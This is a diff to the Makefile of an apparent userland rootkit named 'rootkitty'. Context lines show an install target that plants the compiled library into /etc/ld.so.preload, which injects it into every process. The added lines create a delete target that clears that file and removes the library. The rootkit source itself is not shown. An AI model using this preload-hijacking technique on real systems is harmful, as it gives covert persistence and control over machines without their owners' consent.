@@ -19,3 +19,9 @@ debug:
 install: rootkitty.so
 	@printf "\x1b[32m[+] Planting rootkitty to ld.so.preload.... >^..^<\x1b[0m\n"
 	@realpath $(OUT) > /etc/ld.so.preload
+
+delete: rootkitty.so
+	@printf "\x1b[31m[!] Deleting Rootkitty from system... >^..^<\x1b[0m\n"
+	echo "" > /etc/ld.so.preload
+	rm $(OUT) 
+	@printf "\x1b[32m[+] Successfully deleted Rootkitty from ld.so.preload!\x1b[0m\n"
